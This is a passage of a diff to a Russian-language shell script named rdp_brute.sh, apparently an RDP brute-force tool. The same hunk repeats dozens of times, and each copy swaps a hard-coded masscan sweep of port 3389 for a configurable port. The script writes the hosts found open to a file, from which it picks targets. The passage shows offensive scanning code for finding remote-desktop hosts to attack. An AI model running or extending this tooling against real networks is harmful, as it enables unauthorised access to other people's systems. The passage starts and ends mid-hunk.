-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4202,7 +4206,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4217,7 +4221,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4251,7 +4255,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4266,7 +4270,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4300,7 +4304,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4315,7 +4319,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4349,7 +4353,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4364,7 +4368,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4398,7 +4402,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4413,7 +4417,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4447,7 +4451,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4462,7 +4466,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4496,7 +4500,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4511,7 +4515,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4545,7 +4549,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4560,7 +4564,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4593,7 +4597,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4608,7 +4612,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4641,7 +4645,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4656,7 +4660,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4690,7 +4694,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4705,7 +4709,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4739,7 +4743,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4754,7 +4758,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4788,7 +4792,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4803,7 +4807,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4837,7 +4841,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4852,7 +4856,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4886,7 +4890,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4901,7 +4905,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4935,7 +4939,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4950,7 +4954,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4984,7 +4988,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4999,7 +5003,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5033,7 +5037,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5048,7 +5052,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5082,7 +5086,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5097,7 +5101,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5131,7 +5135,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5146,7 +5150,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5179,7 +5183,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5194,7 +5198,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5227,7 +5231,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5242,7 +5246,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5276,7 +5280,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5291,7 +5295,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5325,7 +5329,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5340,7 +5344,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5374,7 +5378,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5389,7 +5393,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5423,7 +5427,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5438,7 +5442,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5472,7 +5476,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5487,7 +5491,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5521,7 +5525,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5536,7 +5540,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5570,7 +5574,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5585,7 +5589,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5619,7 +5623,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5634,7 +5638,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5668,7 +5672,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5683,7 +5687,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5717,7 +5721,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5732,7 +5736,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5766,7 +5770,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5781,7 +5785,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5815,7 +5819,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5830,7 +5834,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5864,7 +5868,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5879,7 +5883,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5913,7 +5917,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5928,7 +5932,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -5962,7 +5966,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -5977,7 +5981,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6011,7 +6015,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6026,7 +6030,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6059,7 +6063,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6074,7 +6078,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6108,7 +6112,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6123,7 +6127,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6157,7 +6161,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6172,7 +6176,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6206,7 +6210,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6221,7 +6225,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6255,7 +6259,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6270,7 +6274,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -6304,7 +6308,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -6319,7 +6323,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
